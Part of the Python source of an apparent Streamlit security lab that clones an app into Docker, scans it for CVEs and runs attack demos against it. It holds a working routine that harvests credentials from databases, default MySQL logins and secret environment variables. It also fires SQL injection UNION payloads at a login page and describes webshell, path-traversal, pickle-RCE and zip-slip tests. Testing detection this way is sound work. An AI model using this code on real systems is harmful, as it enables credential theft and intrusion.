                        st.info("No SQLite/MySQL user tables found in container — app may use env-based auth or external DB.")


def _extract_creds_from_container(clone_id: str, base_url: str = "") -> list[dict]:
    """
    docker exec into the running clone using Python (built-in sqlite3 module),
    find all databases, extract credentials. Returns [{username, password, source}].
    """
    import subprocess as _sp, json as _json
    found: list[dict] = []
    if not clone_id:
        return found

    def _exec_sh(shell_cmd: str, timeout: int = 10) -> str:
        r = _sp.run(["docker","exec", clone_id, "sh", "-c", shell_cmd],
                    capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()

    def _exec_py(py_code: str, timeout: int = 12) -> str:
        r = _sp.run(["docker","exec", clone_id, "python3", "-c", py_code],
                    capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()

    # ── 1. SQLite via Python (works in all containers that have Python) ──
    _sqlite_script = r"""
import sqlite3, json, glob, os

found = []
search_paths = [
    '/tmp/*.db', '/tmp/*.sqlite', '/tmp/*.sqlite3',
    '/app/*.db', '/app/*.sqlite', '/data/*.db',
    '/*.db', '/var/app/*.db', '/home/**/*.db',
    '/opt/*.db', '/srv/*.db',
]

db_files = []
for pat in search_paths:
    db_files.extend(glob.glob(pat, recursive=True))

# Also find via filesystem
try:
    import subprocess
    r = subprocess.run(
        ['find','/','-name','*.db','-o','-name','*.sqlite','-o','-name','*.sqlite3'],
        capture_output=True, text=True, timeout=6
    )
    for p in r.stdout.splitlines():
        if p and '/proc/' not in p and '/sys/' not in p and p not in db_files:
            db_files.append(p)
except: pass

for db_path in db_files[:8]:
    try:
        conn = sqlite3.connect(db_path)
        tables = [r[0] for r in conn.execute(
            "SELECT name FROM sqlite_master WHERE type='table'")]
        for t in tables:
            try:
                cols = [r[1] for r in conn.execute(f'PRAGMA table_info({t})')]
                ucol = next((c for c in cols if any(k in c.lower()
                    for k in ['user','email','login','name','uname','uid'])), None)
                pcol = next((c for c in cols if any(k in c.lower()
                    for k in ['pass','pwd','secret','hash','token','key'])), None)
                if ucol and pcol:
                    rows = conn.execute(
                        f'SELECT {ucol},{pcol} FROM "{t}" LIMIT 30').fetchall()
                    for row in rows:
                        found.append({
                            'username': str(row[0]),
                            'password': str(row[1]),
                            'source':   f'sqlite:{db_path}>{t}'
                        })
                elif len(cols) >= 2:
                    # Dump first 2 cols anyway if table looks auth-related
                    if any(k in t.lower() for k in ['user','auth','account','login','member','admin']):
                        rows = conn.execute(f'SELECT {cols[0]},{cols[1]} FROM "{t}" LIMIT 20').fetchall()
                        for row in rows:
                            found.append({
                                'username': str(row[0]),
                                'password': str(row[1]),
                                'source':   f'sqlite:{db_path}>{t}(cols:{cols[0]},{cols[1]})'
                            })
            except: pass
        conn.close()
    except: pass

print(json.dumps(found))
"""
    try:
        _out = _exec_py(_sqlite_script)
        if _out.startswith("["):
            _rows = _json.loads(_out)
            found.extend(_rows)
    except Exception:
        pass

    # ── 2. MySQL / MariaDB ──────────────────────────────────────────
    for _cred_str in ["mysql -uroot 2>/dev/null", "mysql -uroot -proot 2>/dev/null",
                      "mysql -uroot -ppassword 2>/dev/null", "mysql -uadmin -padmin 2>/dev/null"]:
        _mysql_test = _exec_sh(
            f'{_cred_str} -e "SELECT table_schema,table_name FROM information_schema.tables '
            f"WHERE table_name REGEXP 'user|account|login|member' "
            f'LIMIT 8" 2>/dev/null')
        if _mysql_test and "ERROR" not in _mysql_test and _mysql_test.strip():
            for line in _mysql_test.splitlines()[1:]:
                parts = line.split()
                if len(parts) == 2:
                    db_n, tbl_n = parts
                    dump = _exec_sh(
                        f'{_cred_str} {db_n} -e "SELECT * FROM {tbl_n} LIMIT 20" 2>/dev/null')
                    for row in dump.splitlines()[1:]:
                        cols_r = row.split("\t")
                        found.append({
                            "username": cols_r[0] if cols_r else "?",
                            "password": cols_r[1] if len(cols_r)>1 else "?",
                            "source":   f"mysql:{db_n}.{tbl_n}",
                        })
            break

    # ── 3. Env vars with sensitive names ───────────────────────────
    env_out = _exec_sh(
        "env 2>/dev/null | grep -iE '^(DB_PASS|MYSQL_PASS|POSTGRES_PASS|SECRET_KEY|"
        "API_KEY|ADMIN_PASS|PASSWORD|PASSWD|APP_SECRET)=' | head -8")
    for line in env_out.splitlines():
        if "=" in line:
            k, v = line.split("=", 1)
            if v.strip():
                found.append({"username": k.strip(), "password": v.strip(),
                              "source": "env:sensitive_var"})

    # ── 4. SQLi UNION HTTP dump ─────────────────────────────────────
    if base_url and len(found) < 3:
        try:
            import requests as _rq
            _login_url = base_url.rstrip("/") + "/login"
            # Try to dump users table via UNION (DB error reveals schema first)
            for _pl in [
                "' UNION SELECT username,password FROM users--",
                "' UNION SELECT email,password FROM users--",
                "' UNION SELECT username,pass FROM users--",
                "' UNION SELECT user,passwd FROM accounts--",
            ]:
                _r = _rq.post(_login_url,
                              data={"username": _pl, "password": "x"},
                              allow_redirects=False, timeout=5)
                body = _r.text
                # In our vulnerable app, DB errors show the query result
                if _r.status_code == 200 and "DB Error:" in body:
                    # Extract credential from error message
                    found.append({"username": _pl, "password": "(SQLi UNION — DB error shows data)",
                                  "source": "sqli:union_http"})
        except Exception:
            pass

    return found


def _render_cve_scan(state: dict, result: dict) -> None:
    """Run OSV CVE scan on the deployed source and render findings table."""
    extract_dir = state.get("extract_dir", "")

    # Fallback: find source from sandbox (covers GitHub deploys + local path)
    if not extract_dir or not os.path.isdir(extract_dir):
        clone_id = result.get("clone_id", "")
        if clone_id:
            try:
                from core.source_clone import SANDBOX_ROOT
                candidate = str(SANDBOX_ROOT / clone_id)
                if os.path.isdir(candidate):
                    extract_dir = candidate
            except Exception:
                pass

    if not extract_dir or not os.path.isdir(extract_dir):
        with st.expander("🔐 Dependency CVE Scan (OSV.dev)", expanded=False):
            st.info("Source directory not found. Re-deploy the app to enable CVE scanning.")
        return

    with st.expander("🔐 Dependency CVE Scan (OSV.dev)", expanded=False):
        scan_key = f"dt_cve_{state.get('job_id', 'x')}"
        if scan_key not in st.session_state:
            if st.button("🔍 Scan for known CVEs", key="dt_cve_btn", type="primary"):
                with st.spinner("Checking OSV.dev for known vulnerabilities…"):
                    from core.cve_scanner import scan_source_dir
                    st.session_state[scan_key] = scan_source_dir(extract_dir)
                st.rerun()
            st.caption("Scans requirements.txt / package.json against the OSV.dev public database (free, no key).")
            return

        report = st.session_state[scan_key]
        eco    = report.get("ecosystem") or "unknown"
        total  = report.get("packages_checked", 0)
        vulns  = report.get("vulns", [])
        err    = report.get("error")

        if err:
            st.error(f"Scan error: {err}")
            if st.button("↻ Retry", key="dt_cve_retry"):
                del st.session_state[scan_key]
                st.rerun()
            return

        # KPI row
        crit  = sum(1 for v in vulns if v["severity"] == "CRITICAL")
        high  = sum(1 for v in vulns if v["severity"] == "HIGH")
        med   = sum(1 for v in vulns if v["severity"] == "MEDIUM")
        low   = sum(1 for v in vulns if v["severity"] in ("LOW", "UNKNOWN"))

        k1, k2, k3, k4, k5 = st.columns(5)
        def _kpi(col, label, val, color):
            col.markdown(
                f'<div style="text-align:center;background:#F8FAFC;border:1px solid #E2E8F0;'
                f'border-radius:8px;padding:10px 4px">'
                f'<div style="font-size:1.5rem;font-weight:700;color:{color}">{val}</div>'
                f'<div style="font-size:0.7rem;color:#64748B;font-family:Inter,sans-serif">{label}</div>'
                f'</div>',
                unsafe_allow_html=True,
            )
        _kpi(k1, "Ecosystem",   eco,   "#0284C7")
        _kpi(k2, "CRITICAL",    crit,  "#DC2626" if crit else "#64748B")
        _kpi(k3, "HIGH",        high,  "#EA580C" if high else "#64748B")
        _kpi(k4, "MEDIUM",      med,   "#D97706" if med  else "#64748B")
        _kpi(k5, f"Packages checked", total, "#0284C7")

        if not vulns:
            st.success(f"✅ No known CVEs found in {total} packages checked.")
            if st.button("↻ Re-scan", key="dt_cve_rescan"):
                del st.session_state[scan_key]
                st.rerun()
            return

        st.markdown(
            f'<div style="font-family:Inter,sans-serif;font-size:0.8rem;color:#475569;'
            f'margin:10px 0 6px"><b>{len(vulns)} vulnerabilities found</b> '
            f'across {total} packages</div>',
            unsafe_allow_html=True,
        )

        for v in vulns:
            fix_str = f" → fix: `{v['fix']}`" if v.get("fix") else ""
            sev_bg = {"CRITICAL": "#FEF2F2", "HIGH": "#FFF7ED",
                      "MEDIUM": "#FFFBEB"}.get(v["severity"], "#F8FAFC")
            st.markdown(
                f'<div style="background:{sev_bg};border-left:4px solid {v["color"]};'
                f'border-radius:0 6px 6px 0;padding:8px 14px;margin:4px 0;'
                f'font-family:Inter,sans-serif">'
                f'<span style="font-size:0.68rem;font-weight:700;color:{v["color"]};'
                f'letter-spacing:0.05em">{v["severity"]}</span>'
                f'<span style="font-size:0.8rem;font-weight:600;color:#1E293B;margin-left:10px">'
                f'`{v["pkg"]}`@{v["version"]}</span>'
                f'<span style="font-size:0.72rem;color:#64748B;margin-left:8px">'
                f'{v["id"]}{fix_str}</span><br>'
                f'<span style="font-size:0.75rem;color:#475569">{v["summary"]}</span>'
                f'</div>',
                unsafe_allow_html=True,
            )

        if st.button("↻ Re-scan", key="dt_cve_rescan2"):
            del st.session_state[scan_key]
            st.rerun()


def _diagnose_crash(logs: str) -> dict:
    """Parse container logs and return a structured crash diagnosis."""
    for pattern, kind, builder in _CRASH_PATTERNS:
        m = pattern.search(logs)
        if m:
            result = builder(m)
            result["kind"] = kind
            return result
    # Generic fallback — couldn't identify specific error
    last_lines = [l.strip() for l in logs.splitlines() if l.strip()][-5:]
    return {
        "kind": "unknown",
        "title": "Container exited unexpectedly",
        "detail": "Could not identify a specific error. Check the full logs below.",
        "last_lines": last_lines,
        "fix_label": None,
        "severity": "error",
    }


def _render_crash_diagnosis(diagnosis: dict, logs: str, result: dict, status: str) -> None:
    """Render a colored crash diagnosis card + raw logs expander."""
    kind     = diagnosis.get("kind", "unknown")
    title    = diagnosis.get("title", "Unknown error")
    detail   = diagnosis.get("detail", "")
    severity = diagnosis.get("severity", "error")
    fix_label = diagnosis.get("fix_label")

    sev_color = {"error": "#DC2626", "warn": "#D97706", "info": "#0284C7"}.get(severity, "#DC2626")
    sev_bg    = {"error": "#FEF2F2", "warn": "#FFFBEB", "info": "#F0F9FF"}.get(severity, "#FEF2F2")
    sev_icon  = {"error": "✗", "warn": "⚠", "info": "ℹ"}.get(severity, "✗")

    st.markdown(
        f'<div style="background:{sev_bg};border:1px solid {sev_color};border-left:4px solid {sev_color};'
        f'border-radius:8px;padding:14px 18px;margin:8px 0 12px">'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.72rem;color:{sev_color};'
        f'font-weight:700;letter-spacing:0.06em;margin-bottom:6px">'
        f'{sev_icon} CRASH DIAGNOSIS · {kind.upper().replace("_"," ")}</div>'
        f'<div style="font-family:Inter,sans-serif;font-size:0.88rem;color:#1E293B;'
        f'font-weight:600;margin-bottom:6px">{title}</div>'
        f'<div style="font-family:Inter,sans-serif;font-size:0.80rem;color:#475569;'
        f'line-height:1.6">{detail}</div>'
        f'</div>',
        unsafe_allow_html=True,
    )

    # Auto-fix button for missing pip packages
    if fix_label and diagnosis.get("fix_pkg"):
        if st.button(f"🔧 {fix_label}", key="dt_autofix_pkg", type="primary"):
            pkg = diagnosis["fix_pkg"]
            cname = result.get("container_name", "")
            with st.spinner(f"Installing {pkg} in container…"):
                import subprocess
                r = subprocess.run(
                    ["docker", "exec", cname, "pip", "install", "--no-cache-dir", pkg],
                    capture_output=True, text=True, timeout=120,
                )
                if r.returncode == 0:
                    subprocess.run(["docker", "restart", cname], capture_output=True)
                    st.success(f"✅ Installed `{pkg}` and restarted container")
                    time.sleep(3)
                    st.rerun()
                else:
                    st.error(f"Install failed: {r.stderr[:200]}")

    # Raw logs in expander
    with st.expander("📋 Full container logs (raw Docker output)",
                     expanded=(kind == "unknown")):
        st.code(logs, language="text")


def _render_preview(result: dict) -> None:
    url   = result.get("url", "")
    port  = result.get("host_port", "?")
    cname = result.get("container_name", "")

    st.markdown(_sec_header("preview", "Live Docker Preview"), unsafe_allow_html=True)

    # ── 3-STATE LIFECYCLE PANEL: Before → Attack → Mitigated ──────
    # Pull session state here — _render_preview is called from many
    # call-sites that don't pass it through as a parameter.
    _life_state = st.session_state.get("dt_state", {}) or {}
    _render_lifecycle_panel(result, _life_state)

    # ── Container status check ────────────────────────────────────
    status = _get_container_status(result)
    is_running = (status == "running")

    if not is_running:
        c_warn, c_btn = st.columns([3, 1])
        with c_warn:
            st.warning(
                f"⚠️ Container **{cname}** is `{status}`. "
                f"Click **Restart** to bring it back online."
            )
        with c_btn:
            if st.button("🔄 Restart Container", key="dt_restart_ctr", type="primary"):
                with st.spinner("Restarting container..."):
                    ok = _restart_container(result)
                if ok:
                    import time as _t; _t.sleep(3)
                    new_status = _get_container_status(result)
                    if new_status == "running":
                        st.success(f"✅ Container running on port {port}")
                    else:
                        st.warning(f"Container is `{new_status}` — see logs below for why it stopped.")
                    st.rerun()
                else:
                    st.error("Restart failed — check Docker Desktop is running.")

        # Real crash diagnostics — parse logs and show a human-readable explanation
        logs = _get_container_logs(result, tail=60)
        if logs:
            diagnosis = _diagnose_crash(logs)
            _render_crash_diagnosis(diagnosis, logs, result, status)
        return

    # ── Browser bar UI ────────────────────────────────────────────
    st.markdown(f"""
<div class="dt-preview">
  <div class="dt-prev-bar">
    <div class="dt-prev-dots">
      <span class="r"></span><span class="y"></span><span class="g"></span>
    </div>
    <div class="dt-urlbar">
      <span class="dt-live-dot"></span>
      {url or f"http://localhost:{port}"}
    </div>
    <a href="{url}" target="_blank"
       style="padding:5px 13px;background:{RB};color:#fff;border-radius:7px;
              font-family:{MONO};font-size:.7rem;text-decoration:none;font-weight:700">
      ↗ Open
    </a>
  </div>
</div>""", unsafe_allow_html=True)

    # ── Direct iframe (most reliable for localhost) ───────────────
    if url:
        try:
            components.iframe(url, height=500, scrolling=True)
        except Exception:
            # Fallback: raw HTML iframe embed
            components.html(
                f'<iframe src="{url}" width="100%" height="480"'
                f' style="border:none;display:block;border-radius:0 0 13px 13px;">'
                f'</iframe>',
                height=484,
            )

    # ── Quick-open helper (some browsers block localhost iframes) ─
    st.info(
        f"💡 **If iframe appears blank:** Click "
        f"[Open in new tab →]({url}) "
        f"(some browsers block localhost inside iframes). "
        f"Edit → Save in workbench → refresh that tab to see live changes."
    )

    st.caption(
        f"🐳 Container: `{cname}` · Port `{port}` · "
        f"Edit in workbench → 💾 Save → `docker cp` pushes to container → "
        f"reload tab to see live change."
    )

    # v24: live logs + env manager now consolidated into a single
    # diagnostics tab inside the actions toolbar at the bottom — no
    # longer rendered standalone here.


# ─────────────────────────────────────────────────────────────────────
#  LIVE MALWARE LAB  (inject real-but-safe malware into the running clone,
#  trigger it over HTTP / docker-exec, capture the REAL live reaction)
# ─────────────────────────────────────────────────────────────────────
# UI metadata keyed to core.live_malware_lab.SAMPLES (all light-theme colours)
_LAB_SAMPLES = [
    # ── LIVE (real HTTP trigger in clone container) ──────────────────────
    {"key": "eicar", "icon": "🧪", "label": "EICAR AV Test",
     "color": "#7C3AED", "bg": "#FAF5FF", "border": "#E9D5FF",
     "desc": "Inject harmless AV trigger file → clone serves it → ML detector fires",
     "why": (
         "EICAR is the official 68-byte AV test string — every antivirus engine on earth "
         "MUST flag it by specification. It is completely harmless but triggers real scanner alerts. "
         "We inject it into the isolated clone to prove our ML detection pipeline would catch "
         "a real malware file dropped the same way. The BEFORE→AFTER diff shows the clone's "
         "/tmp directory changing, proving the file actually landed on the container filesystem."
     )},
    {"key": "php_webshell", "icon": "🐚", "label": "PHP Webshell · RCE",
     "color": "#DC2626", "bg": "#FEF2F2", "border": "#FCA5A5",
     "desc": "Write shell.php into clone → hit it → live whoami/id/ls output",
     "why": (
         "A webshell is a backdoor planted inside a web server that lets an attacker run "
         "any system command via a normal HTTP request in a browser. Once shell.php lands in "
         "/var/www, visiting ?cmd=whoami reveals the attacker is running as root. "
         "We use docker exec (works on any container stack) to show 6 real recon steps: "
         "identity, kernel, full filesystem map, environment secrets dump, network scan, "
         "and credential search through source files."
     )},
    {"key": "php_dropper", "icon": "💧", "label": "Live Malware Drop",
     "color": "#EA580C", "bg": "#FFF7ED", "border": "#FDBA74",
     "desc": "Dropper script writes EICAR live inside clone — tests write-to-disk step",
     "why": (
         "Malware droppers are the delivery stage — a tiny script whose only job is to "
         "write the actual payload (ransomware, RAT, cryptominer) to disk and execute it. "
         "In real attacks the dropper arrives first via email attachment or upload, then "
         "silently fetches the real malware. This test runs the dropper live inside the clone, "
         "proves the write-to-disk step works, and verifies the dropped file matches the known "
         "EICAR SHA256 hash — exactly how a real malware drop would be confirmed forensically."
     )},
    {"key": "path_traversal", "icon": "📂", "label": "Path Traversal (LFI)",
     "color": "#B45309", "bg": "#FFFBEB", "border": "#FED7AA",
     "desc": "../../etc/passwd + /proc/self/environ probes → leaks server secrets live",
     "why": (
         "Path Traversal (Local File Inclusion) exploits missing sanitisation in file-path "
         "handling — an attacker escapes the web root using ../../ sequences and reads any "
         "file on the server. Target files include /etc/passwd (user accounts), "
         "/proc/self/environ (ALL environment variables with DB passwords and API keys), "
         "and .env / config.py files with database credentials. We read them live from the "
         "clone to show exactly what leaks when one input validation check is missing."
     )},
    {"key": "header_injection", "icon": "📨", "label": "Header Injection",
     "color": "#0E7490", "bg": "#ECFEFF", "border": "#A5F3FC",
     "desc": "SQLi · XSS · Log4Shell · SSRF · path bypass via HTTP headers — 5 in one request",
     "why": (
         "HTTP headers like X-Forwarded-For and User-Agent are logged and trusted by apps "
         "but almost never sanitised. We fire 5 attack payloads in a single HTTP request: "
         "SQL injection that breaks DB queries, XSS that executes in admin panels, "
         "Log4Shell JNDI (CVE-2021-44228 — the 2021 critical zero-day), SSRF that "
         "makes the server fetch AWS cloud metadata credentials, and admin path bypass. "
         "We then check the container logs to see exactly which payloads the app recorded."
     )},
    {"key": "file_upload_exploit", "icon": "📤", "label": "File Upload → Shell",
     "color": "#7C2D12", "bg": "#FFF7ED", "border": "#FCD9B6",
     "desc": "POST webshell disguised as JPEG → tests if clone's upload endpoint accepts it",
     "why": (
         "File upload endpoints are one of the most common real-world RCE entry points. "
         "Attackers disguise a PHP webshell as an image using JPEG magic bytes (\\xFF\\xD8\\xFF) "
         "and a double extension (shell.php.jpg) to bypass naive MIME-type checks. "
         "If the server validates only the extension or Content-Type header — not the actual "
         "file content — the shell lands in /uploads/ and the next GET request gives full "
         "command execution. We probe 5 upload paths against the clone to find any that accept it."
     )},
    # ── v25 file-type-aware attacks ──────────────────────────────────────
    {"key": "pickle_rce", "icon": "🐍", "label": "Python Pickle RCE",
     "color": "#0D9488", "bg": "#F0FDFA", "border": "#5EEAD4",
     "desc": "Drop pickle payload → python3 loads it → real os.system runs inside container",
     "why": (
         "Python's pickle module deserialises objects by REBUILDING them — calling __reduce__ "
         "on load — which lets a crafted payload run os.system the moment pickle.load() opens it. "
         "This is CWE-502 (Deserialisation of Untrusted Data) and shows up everywhere: cached "
         "session data, ML model weights, message queues, Celery results. We build a genuine "
         "pickle byte stream, drop it into the clone, run python3 to load it, and READ /tmp/"
         "PICKLE_PWNED.txt to prove arbitrary code executed. Then we grep the clone source for "
         "real pickle.load() sinks — every match is a production RCE."
     )},
    {"key": "zip_slip", "icon": "🗜️", "label": "Zip-Slip (CVE-2018-1002101)",
     "color": "#9333EA", "bg": "#FAF5FF", "border": "#D8B4FE",
     "desc": "Craft ZIP with ../ entry → naive unzip escapes target dir → file lands in /tmp/",
     "why": (
         "Zip-Slip exploits ZIP archives whose entries contain ../ sequences. When the app "
         "extracts to /tmp/extract, the entry named ../../../../tmp/EVIL.txt escapes the "
         "extraction dir and lands wherever the attacker chose. The 2018 disclosure showed "
         "vulnerable extract code in Apache Commons Compress, Spring, Snyk's own tooling, "
         "and hundreds of other libraries. We build a real malicious ZIP, extract it inside "
         "the clone, and prove the escape by reading /tmp/ZIPSLIP_PWNED.txt — a file that "
         "should NOT exist under any honest extraction policy."
     )},
    {"key": "pdf_js", "icon": "📕", "label": "Malicious PDF · JS + Launch",
     "color": "#DB2777", "bg": "#FDF2F8", "border": "#F9A8D4",
     "desc": "Generate PDF with /JavaScript + /Launch + EICAR in stream — ML scanner catches it",
     "why": (
         "PDFs aren't just documents — the PDF spec allows /JavaScript actions (auto-run on "
         "open in any reader with JS enabled — Adobe Reader, Foxit), /Launch actions (auto-"
         "execute /bin/sh or calc.exe), and embedded files (data exfiltration). We hand-craft "
         "a valid PDF carrying ALL THREE: alert-popup JS, Launch action pointing to /bin/sh, "
         "and an EICAR string buried in the content stream. Then we grep the dropped bytes to "
         "PROVE the malicious markers are present — and feed the file to the ML scanner to "
         "show real malware ML flags it as malicious without ever opening the PDF."
     )},
    # ── v28: 5 industry-standard detection-test attacks ──────────────────
    {"key": "gtube", "icon": "📧", "label": "GTUBE Email-AV Test",
     "color": "#0EA5E9", "bg": "#F0F9FF", "border": "#7DD3FC",
     "desc": "RFC-style spam-test email — every anti-spam engine MUST flag the 68-char marker",
     "why": (
         "GTUBE (Generic Test for Unsolicited Bulk Email) is the email-AV equivalent of EICAR. "
         "It's a 68-character string that every RFC-compliant spam filter — SpamAssassin, "
         "Rspamd, Microsoft Exchange Transport Rules, Gmail — is required by spec to flag as "
         "spam. We ship a complete RFC-822 email envelope (From/To/Subject + body containing "
         "the GTUBE marker) and verify (a) the bytes land, (b) the marker survives transport, "
         "(c) the SHA256 is deterministic across all containers — exactly how production "
         "email-security teams test their gateway detection without sending real spam."
     )},
    {"key": "lolbin", "icon": "📜", "label": "LOLBin Pattern Test",
     "color": "#A16207", "bg": "#FFFBEB", "border": "#FDE68A",
     "desc": "25 Living-Off-the-Land binary patterns (certutil/powershell/wmic) — tests fileless-attack ML",
     "why": (
         "Modern APT groups (Lazarus, APT29, FIN7) don't drop malware binaries any more — they "
         "use legitimate Windows tools like certutil, powershell, wmic and mshta to download "
         "and execute payloads in memory. This is called Living-Off-the-Land (LOLBAS — the "
         "real catalog is at lolbas-project.github.io). We ship a file containing 25 real "
         "LOLBin command patterns lifted directly from APT incident reports. Any behaviour-"
         "based ML engine MUST flag this file as suspicious by string density alone — exactly "
         "how CrowdStrike Falcon, Defender for Endpoint, and Elastic Security catch fileless "
         "attacks today."
     )},
    {"key": "pe_anomaly", "icon": "🪟", "label": "PE Header Anomaly",
     "color": "#7C3AED", "bg": "#FAF5FF", "border": "#DDD6FE",
     "desc": "Hand-crafted Windows EXE — RWX section + no imports + high entropy → ML must flag",
     "why": (
         "Real next-generation AV doesn't rely on signatures — it scores the SHAPE of an "
         "executable: section flags, entry-point location, import count, byte-histogram "
         "entropy. We hand-build a minimal 32-bit PE that's structurally invalid (not "
         "executable) but carries every malware shape indicator: a section flagged RWX "
         "(writable AND executable — vanishingly rare in legitimate code), zero imports table "
         "(common in packed/obfuscated malware), TimeDateStamp=0 (anti-forensic), and high-"
         "entropy payload bytes (looks packed/encrypted). The ML must flag it as malicious "
         "without any signature match — pure shape-based detection, what modern Sophos, "
         "Kaspersky and ESET heuristic engines do."
     )},
    {"key": "macro_doc", "icon": "📄", "label": "Macro Office Doc",
     "color": "#B91C1C", "bg": "#FEF2F2", "border": "#FCA5A5",
     "desc": "Inert .docm with vbaProject.bin + AutoOpen macro — same shape as Emotet/Trickbot",
     "why": (
         "Office macros are the #1 ransomware delivery vector — Emotet, TrickBot, Dridex, "
         "Qbot all arrive as macro-enabled .docm or .xlsm. We build a structurally complete "
         ".docm archive containing the EXACT files real malicious documents have: "
         "[Content_Types].xml declaring macroEnabled content, word/document.xml body, and "
         "word/vbaProject.bin carrying AutoOpen + Document_Open + AutoExec VBA stubs (the "
         "three macro entry points that auto-fire when the doc opens). The macros are "
         "completely inert — but the file SHAPE matches Emotet 100%, so olevba, oledump, "
         "Defender ATP and our ML all flag it. Best demo of macro-malware detection without "
         "any real malware risk."
     )},
    {"key": "yara_test", "icon": "🎯", "label": "YARA Self-Test",
     "color": "#16A34A", "bg": "#F0FDF4", "border": "#86EFAC",
     "desc": "3 custom YARA rules + 3 matching fixture files — proves OUR detection logic fires",
     "why": (
         "YARA is the industry-standard threat-hunting language (used by Mandiant, "
         "CrowdStrike, Kaspersky and every CERT team globally). Vendor AV signatures detect "
         "vendor's catalog — but a senior security engineer writes their OWN YARA rules to "
         "catch attacks specific to their environment. We ship THREE custom AIDTCTM YARA "
         "rules (Custom_Webshell, Custom_Dropper, Custom_Recon) plus three fixture files "
         "designed to match each rule's exact conditions. The exec phase runs `yara` against "
         "the fixtures and proves all three rules fire — your own detection logic, not a "
         "vendor's. Threat-hunters call this a 'rule self-test' — every production hunting "
         "team does it as part of CI."
     )},
]

# status → (text colour, left-border, soft bg) — Arctic-Frost light palette
_LAB_STATUS_STYLE = {
    "crit": ("#B91C1C", "#DC2626", "#FEF2F2"),
    "ok":   ("#15803D", "#16A34A", "#F0FDF4"),
    "warn": ("#B45309", "#D97706", "#FFFBEB"),
    "info": ("#0369A1", "#0284C7", "#F0F9FF"),
}
_LAB_PHASE_LABEL = {
    "pre":     "BEFORE",  "inject":  "INJECT",  "confirm": "CONFIRM",
    "exec":    "EXEC",    "http":    "HTTP",    "trigger": "TRIGGER",
    "detect":  "DETECT",  "post":    "AFTER",   "summary": "DONE",
}


def _lab_event_html(ev: dict) -> str:
    """
    v26 — Markdown-safe event row.

    Root-cause fix vs v25: Streamlit's markdown parser auto-wraps stray
    inline content in <p>, then must close the <p> before any sibling
    <div> — which leaks the closing </span> as literal text. Solution:
    NEVER put <span> and <div> as siblings inside the same parent. The
    header spans now live inside a dedicated header <div>; the optional
    detail block is its block-level sibling. Parent has *only* block
    children → markdown can't break it.

    All other rules from v25 (compact sizes, full html.escape, max-height
    on pre block, single closed outer div) are retained.
    """
    import html as _html

    _STATUS = {
        "crit": ("#7F1D1D", "#DC2626", "#FEF2F2", "#FECACA"),
        "ok":   ("#14532D", "#16A34A", "#F0FDF4", "#BBF7D0"),
        "warn": ("#7C2D12", "#D97706", "#FFFBEB", "#FDE68A"),
        "info": ("#1E3A8A", "#0284C7", "#F0F9FF", "#DBEAFE"),
    }
    fg, bd, bg, chip = _STATUS.get(ev.get("status", "info"), _STATUS["info"])
    phase = _LAB_PHASE_LABEL.get(ev.get("phase", ""), (ev.get("phase", "") or "INFO").upper())

    text   = _html.escape(ev.get("text", "") or "")
    det_raw = ev.get("detail", "") or ""
    det    = _html.escape(det_raw)

    # Detail block — block-level sibling to the header div
    det_html = ""
    if det_raw:
        if det_raw.startswith(("GET ", "POST ", "PUT ", "PATCH ", "DELETE ", "HEAD ")):
            lbl = "&rarr; HTTP"
        elif det_raw.startswith("HTTP/"):
            lbl = "&larr; RESPONSE"
        elif "\n" in det_raw:
            lbl = "&#9656; OUTPUT"
        else:
            lbl = ""

        header_bar = ""
        if lbl or det_raw:
            header_bar = (
                f'<div style="display:flex;justify-content:space-between;'
                f'align-items:center;margin-bottom:3px">'
                f'<span style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
                f'font-weight:700;color:#64748B;letter-spacing:0.08em">{lbl}</span>'
                f'<span style="font-family:JetBrains Mono,monospace;font-size:0.52rem;'
                f'color:#94A3B8">{len(det_raw)}b</span>'
                f'</div>'
            )
        det_html = (
            f'<div style="margin-top:4px;background:#FAFBFC;border:1px solid #E2E8F0;'
            f'border-radius:5px;padding:5px 9px">'
            + header_bar
            + f'<pre style="margin:0;padding:0;font-family:JetBrains Mono,monospace;'
            f'font-size:0.66rem;color:#1E293B;background:transparent;'
            f'white-space:pre-wrap;line-height:1.5;word-break:break-word;'
            f'max-height:140px;overflow:auto">{det}</pre>'
            f'</div>'
        )

    # Parent has ONLY block children (header div + optional detail div).
    # Eliminates the <p>-wrap-then-close issue that leaked </span> as text.
    return (
        f'<div style="background:{bg};border:1px solid #E2E8F0;'
        f'border-left:3px solid {bd};border-radius:6px;'
        f'padding:6px 10px;margin-bottom:4px">'
        f'<div style="display:flex;align-items:center;gap:7px;line-height:1.5">'
        f'<span style="font-family:JetBrains Mono,monospace;'
        f'font-size:0.55rem;font-weight:700;color:{fg};background:{chip};'
        f'border-radius:4px;padding:2px 8px;flex-shrink:0;'
        f'letter-spacing:0.06em">{phase}</span>'
        f'<span style="font-family:Inter,sans-serif;font-size:0.74rem;color:{fg};'
        f'font-weight:500;flex:1;min-width:0">{text}</span>'
        f'</div>'
        f'{det_html}'
        f'</div>'
    )


def _render_attack_panel(state: dict, result: dict) -> None:
    url      = result.get("url", "")
    clone_id = result.get("clone_id", "")
    stack    = result.get("stack", {})
    lang     = (stack or {}).get("language", "?")

    # ── v29/30: Page-level responsive CSS + cross-platform polish ──
    # Mobile (≤768px) stacks all Streamlit columns to full width, scales
    # iframes down, lifts buttons to 44px touch targets per Apple HIG.
    # v30 adds: pre/code horizontal scroll, table responsiveness, long-
    # URL break, scrollbar styling for Windows Chromium iframes.
    st.html(
        '<style id="aidtctm-dt-responsive">'
        # Constrain main content area to centered 1200px max
        'section[data-testid="stMain"] .block-container{max-width:1200px !important;'
        'padding-left:18px !important;padding-right:18px !important}'
        # Long content overflow protection (Windows + mobile both benefit)
        'section[data-testid="stMain"] pre{overflow-x:auto;max-width:100%}'
        'section[data-testid="stMain"] code{word-break:break-word;'
        'overflow-wrap:anywhere}'
        # Tame Windows Chromium fat scrollbars in our inner panels
        'section[data-testid="stMain"] pre::-webkit-scrollbar,'
        'section[data-testid="stMain"] div[style*="overflow"]::-webkit-scrollbar{'
          'height:6px;width:6px}'
        'section[data-testid="stMain"] pre::-webkit-scrollbar-thumb,'
        'section[data-testid="stMain"] div[style*="overflow"]::-webkit-scrollbar-thumb{'
          'background:#CBD5E1;border-radius:3px}'
        # Mobile breakpoint — stack everything
        '@media (max-width:768px){'
          'section[data-testid="stMain"] div[data-testid="stHorizontalBlock"] > div{'
